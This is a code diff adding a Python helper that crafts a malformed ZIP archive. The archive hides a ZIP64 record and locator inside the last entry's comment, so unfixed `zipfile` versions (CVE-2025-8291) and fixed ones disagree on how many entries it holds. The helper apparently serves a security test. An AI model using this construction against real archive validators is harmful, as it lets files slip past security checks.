@@ -7,6 +7,8 @@ packs it into an archive, so one layout serves both inputs.
 """
 from __future__ import annotations
 
+import io
+import struct
 import zipfile
 from collections.abc import Mapping
 from pathlib import Path
@@ -102,3 +104,43 @@ def write_zip(path: Path, files: Export, *, prefix: str = "") -> Path:
         for rel, content in files.items():
             zf.writestr(f"{prefix}{rel}", _bytes(content))
     return path
+
+
+def old_zipfile_bypass(count: int) -> bytes:
+    """sec-104's shape against a ``zipfile`` without the CVE-2025-8291 fix (synthetic).
+
+    A ZIP64 record at the locator's offset claims a one-entry directory (the
+    last header), zero padding sits just before the locator, and that last
+    header's comment swallows the record, the padding and the locator. A fixed
+    ``zipfile`` reads the record at the locator's offset (one entry); an unfixed
+    one reads the padding, finds no record, keeps the plain end record and
+    parses all ``count`` entries.
+    """
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as zf:
+        for i in range(count):
+            zf.writestr(f"f{i}.md", b"x")
+    data = buf.getvalue()
+    eocd_at = data.rfind(b"PK\x05\x06")
+    cd_offset = struct.unpack_from("<L", data, eocd_at + 16)[0]
+    directory = bytearray(data[cd_offset:eocd_at])
+    pos = last = 0
+    while pos < len(directory):
+        last = pos
+        name, extra, comment = struct.unpack_from("<3H", directory, pos + 28)
+        pos += 46 + name + extra + comment
+    last_at = cd_offset + last
+    padding = b"\x00" * 56
+    reloff = eocd_at  # the small record starts where the real directory ended
+    record = struct.pack(
+        "<4sQ2H2L4Q", b"PK\x06\x06", 44 + len(padding), 45, 45, 0, 0, 1, 1,
+        reloff - last_at, last_at,
+    )
+    locator = struct.pack("<4sLQL", b"PK\x06\x07", 0, reloff, 1)
+    swallowed = record + padding + locator
+    struct.pack_into("<H", directory, last + 32, comment + len(swallowed))
+    new_directory = bytes(directory) + swallowed
+    eocd = struct.pack(
+        "<4s4H2LH", b"PK\x05\x06", 0, 0, count, count, len(new_directory), cd_offset, 0
+    )
+    return data[:cd_offset] + new_directory + eocd
